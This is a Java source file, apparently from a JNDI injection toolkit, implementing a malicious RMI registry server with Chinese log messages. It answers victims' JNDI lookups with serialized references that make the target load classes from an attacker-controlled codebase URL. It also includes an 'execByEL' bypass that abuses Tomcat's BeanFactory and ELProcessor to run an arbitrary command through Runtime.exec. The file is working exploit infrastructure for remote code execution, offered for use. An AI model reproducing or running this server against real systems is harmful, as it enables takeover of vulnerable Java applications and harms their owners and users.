165
https://raw.githubusercontent.com/JosephTribbianni/JNDI/master/src/main/java/org/su18/server/RMIServer.java
package org.su18.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.naming.ResourceRef;
import org.su18.utils.*;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.TransportConstants;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;
import java.util.Arrays;

public class RMIServer implements Runnable {


	private ServerSocket ss;

	private final Object waitLock = new Object();

	private boolean exit;

	private boolean hadConnection;

	private URL classpathUrl;


	public RMIServer(int port, URL classpathUrl) throws IOException {
		this.classpathUrl = classpathUrl;
		this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
	}

	public boolean waitFor(int i) {
		try {
			if (this.hadConnection) {
				return true;
			}
			Logger.print(" RMI  服务器  >> 正在等待连接");
			synchronized (this.waitLock) {
				this.waitLock.wait(i);
			}
			return this.hadConnection;
		} catch (InterruptedException e) {
			return false;
		}
	}


	/**
	 *
	 */
	public void close() {
		this.exit = true;
		try {
			this.ss.close();
		} catch (IOException ignored) {
		}
		synchronized (this.waitLock) {
			this.waitLock.notify();
		}
	}


	public void run() {
		try {
			@SuppressWarnings("resource")
			Socket s = null;
			try {
				while (!this.exit && (s = this.ss.accept()) != null) {
					try {
						s.setSoTimeout(5000);
						InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
						Logger.info(" RMI  服务器  >> 收到来自 " + remote + " 的连接请求");

						InputStream is    = s.getInputStream();
						InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

						bufIn.mark(4);
						try (DataInputStream in = new DataInputStream(bufIn)) {
							int magic = in.readInt();

							short version = in.readShort();
							if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
								s.close();
								continue;
							}

							OutputStream         sockOut = s.getOutputStream();
							BufferedOutputStream bufOut  = new BufferedOutputStream(sockOut);
							try (DataOutputStream out = new DataOutputStream(bufOut)) {

								byte protocol = in.readByte();
								switch (protocol) {
									case TransportConstants.StreamProtocol:
										out.writeByte(TransportConstants.ProtocolAck);
										if (remote.getHostName() != null) {
											out.writeUTF(remote.getHostName());
										} else {
											out.writeUTF(remote.getAddress().toString());
										}
										out.writeInt(remote.getPort());
										out.flush();
										in.readUTF();
										in.readInt();
									case TransportConstants.SingleOpProtocol:
										doMessage(s, in, out);
										break;
									default:
									case TransportConstants.MultiplexProtocol:
										Logger.error(" RMI  服务器  >> 不支持的协议");
										s.close();
										continue;
								}

								bufOut.flush();
								out.flush();
							}
						}
					} catch (InterruptedException e) {
						return;
					} catch (Exception e) {
						e.printStackTrace(System.err);
					} finally {
						Logger.info(" RMI  服务器  >> 正在关闭连接");
						s.close();
					}

				}

			} finally {
				if (s != null) {
					s.close();
				}
				if (this.ss != null) {
					this.ss.close();
				}
			}

		} catch (SocketException ignored) {
		} catch (Exception e) {
			e.printStackTrace(System.err);
		}
	}


	private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
		Logger.info(" RMI  服务器  >> 正在读取信息");

		int op = in.read();

		switch (op) {
			case TransportConstants.Call:
				doCall(in, out);
				break;

			case TransportConstants.Ping:
				out.writeByte(TransportConstants.PingAck);
				break;

			case TransportConstants.DGCAck:
				UID.read(in);
				break;

			default:
				throw new IOException(" RMI  服务器  >> 无法识别：" + op);
		}

		s.close();
	}


	private void doCall(DataInputStream in, DataOutputStream out) throws Exception {
		ObjectInputStream ois = new ObjectInputStream(in) {

			@Override
			protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
				if ("[Ljava.rmi.jndi.ObjID;".equals(desc.getName())) {
					return ObjID[].class;
				} else if ("java.rmi.jndi.ObjID".equals(desc.getName())) {
					return ObjID.class;
				} else if ("java.rmi.jndi.UID".equals(desc.getName())) {
					return UID.class;
				} else if ("java.lang.String".equals(desc.getName())) {
					return String.class;
				}
				throw new IOException(" RMI  服务器  >> 无法读取 Object");
			}
		};

		ObjID read;
		try {
			read = ObjID.read(ois);
		} catch (IOException e) {
			throw new MarshalException(" RMI  服务器  >> 无法读取 ObjID");
		}

		if (read.hashCode() == 2) {
			// DGC
			handleDGC(ois);
		} else if (read.hashCode() == 0) {
			if (handleRMI(ois, out)) {
				this.hadConnection = true;
				synchronized (this.waitLock) {
					this.waitLock.notifyAll();
				}
			}
		}

	}


	private boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
		int method = ois.readInt(); // method
		ois.readLong(); // hash

		if (method != 2) { // lookup
			return false;
		}

		String object = (String) ois.readObject();
		Logger.info(" RMI  服务器  >> RMI 查询 " + object + " " + method);
		String reference;
		String cpstring = this.classpathUrl.toString();
		if (!"BypassByEL".equals(object)) {
			reference = Mapper.reflect.get(StringUtil.getClassName(object));
		} else {
			reference = object;
		}

		if (reference == null) {
			Logger.info(" RMI  服务器  >> 引用名称查询失败：" + object);
			return false;
		}
		URL turl = new URL(cpstring + "#" + reference);
		out.writeByte(TransportConstants.Return);// transport op
		try (ObjectOutputStream oos = new MarshalOutputStream(out, turl)) {

			oos.writeByte(TransportConstants.NormalReturn);
			new UID().write(oos);

			ReferenceWrapper rw = ReflectionUtil.createWithoutConstructor(ReferenceWrapper.class);

			if (reference.startsWith("Bypass")) {
				Logger.info(" RMI  服务器  >> 发送本地类加载引用");
				ReflectionUtil.setFieldValue(rw, "wrappee", execByEL());

			} else {
				Logger.info(" RMI  服务器  >> 向目标发送 stub " + new URL(cpstring + reference.concat(StringUtil.getVersion(object) + ".class")));

				ReflectionUtil.setFieldValue(rw, "wrappee", new Reference("Foo", reference.concat(StringUtil.getVersion(object)), turl.toString()));
			}
			Field refF = RemoteObject.class.getDeclaredField("ref");
			refF.setAccessible(true);
			refF.set(rw, new UnicastServerRef(12345));

			oos.writeObject(rw);

			oos.flush();
			out.flush();
		}
		return true;
	}

	/*
	 * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because of javax.el.ELProcessor.
	 */
	public ResourceRef execByEL() {
		ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
		ref.add(new StringRefAddr("forceString", "x=eval"));
		ref.add(new StringRefAddr("x", String.format(
				"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
						"\"java.lang.Runtime.getRuntime().exec('%s')\"" +
						")", StringUtil.getCurrentPropertiesValue("command")

		)));
		return ref;
	}


	private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
		ois.readInt(); // method
		ois.readLong(); // hash
		Logger.info(" RMI  服务器  >> DGC 调用" + Arrays.toString((ObjID[]) ois.readObject()));
	}


	protected static Object makeDummyObject(String className) {
		try {
			ClassLoader isolation = new ClassLoader() {
			};
			ClassPool cp = new ClassPool();
			cp.insertClassPath(new ClassClassPath(Dummy.class));
			CtClass clazz = cp.get(Dummy.class.getName());
			clazz.setName(className);
			return clazz.toClass(isolation).newInstance();
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

	public static class Dummy implements Serializable {

		private static final long serialVersionUID = 1L;

	}

	static final class MarshalOutputStream extends ObjectOutputStream {

		private URL sendUrl;


		public MarshalOutputStream(OutputStream out, URL u) throws IOException {
			super(out);
			this.sendUrl = u;
		}


		MarshalOutputStream(OutputStream out) throws IOException {
			super(out);
		}


		@Override
		protected void annotateClass(Class<?> cl) throws IOException {
			if (this.sendUrl != null) {
				writeObject(this.sendUrl.toString());
			} else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
				writeObject(null);
			} else {
				URL[]         us = ((URLClassLoader) cl.getClassLoader()).getURLs();
				StringBuilder cb = new StringBuilder();

				for (URL u : us) {
					cb.append(u.toString());
				}
				writeObject(cb.toString());
			}
		}


		/**
		 * 从指定位置加载并序列化一个类
		 */
		@Override
		protected void annotateProxyClass(Class<?> cl) throws IOException {
			annotateClass(cl);
		}
	}
}